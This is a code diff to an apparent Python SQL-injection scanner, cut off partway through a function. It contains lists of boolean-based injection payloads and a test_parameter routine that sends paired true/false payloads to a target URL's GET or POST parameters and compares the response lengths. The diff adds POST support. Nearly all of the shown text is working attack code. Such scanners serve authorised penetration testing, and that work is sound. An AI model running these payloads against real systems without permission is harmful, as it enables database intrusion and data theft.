@@ -1,5 +1,5 @@
 import urllib.parse
-import urllib.request
+from ..utils import send_request
 
 PAYLOADS_TRUE = [
     "' OR '1'='1",
@@ -15,41 +15,66 @@ PAYLOADS_FALSE = [
     '" OR 1=2-- '
 ]
 
-def fetch(url: str) -> str:
+def fetch(url: str, method: str = "get", data: dict | None = None) -> str:
     """Fetch a URL and return the body as text."""
-    with urllib.request.urlopen(url) as resp:
-        return resp.read().decode('utf-8', errors='replace')
+    return send_request(url, method=method, data=data)
 
 
-def test_parameter(url: str, param: str, value: str):
+def test_parameter(
+    url: str, param: str, value: str, method: str = "get", data: dict | None = None
+):
     """Attempt boolean-based SQL injection on a parameter."""
+    data = data or {}
     parsed = urllib.parse.urlparse(url)
     query = urllib.parse.parse_qs(parsed.query)
-    original = query.get(param, [''])[0]
-
-    try:
-        baseline_body = fetch(url)
-    except Exception as e:
-        baseline_body = str(e)
+    if method.lower() == "get":
+        original = query.get(param, [''])[0]
+        try:
+            baseline_body = fetch(url)
+        except Exception as e:
+            baseline_body = str(e)
+    else:
+        original = data.get(param, "")
+        try:
+            baseline_body = fetch(url, method="post", data=data)
+        except Exception as e:
+            baseline_body = str(e)
     baseline_len = len(baseline_body)
 
     results = []
     for p_true, p_false in zip(PAYLOADS_TRUE, PAYLOADS_FALSE):
-        query[param] = original + p_true
-        new_query = urllib.parse.urlencode(query, doseq=True)
-        true_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
-        try:
-            body_true = fetch(true_url)
-        except Exception as e:
-            body_true = str(e)
+        if method.lower() == "get":
+            query[param] = original + p_true
+            new_query = urllib.parse.urlencode(query, doseq=True)
+            true_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
+            try:
+                body_true = fetch(true_url)
+            except Exception as e:
+                body_true = str(e)
 
-        query[param] = original + p_false
-        new_query = urllib.parse.urlencode(query, doseq=True)
-        false_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
-        try:
-            body_false = fetch(false_url)
-        except Exception as e:
-            body_false = str(e)
+            query[param] = original + p_false
+            new_query = urllib.parse.urlencode(query, doseq=True)
+            false_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
+            try:
+                body_false = fetch(false_url)
+            except Exception as e:
+                body_false = str(e)
+        else:
+            post_true = data.copy()
+            post_true[param] = original + p_true
+            true_url = url
+            try:
+                body_true = fetch(true_url, method="post", data=post_true)
+            except Exception as e:
+                body_true = str(e)
+
+            post_false = data.copy()
+            post_false[param] = original + p_false
+            false_url = url
+            try:
+                body_false = fetch(false_url, method="post", data=post_false)
+            except Exception as e:
+                body_false = str(e)
 
         len_true = len(body_true)
         len_false = len(body_false)
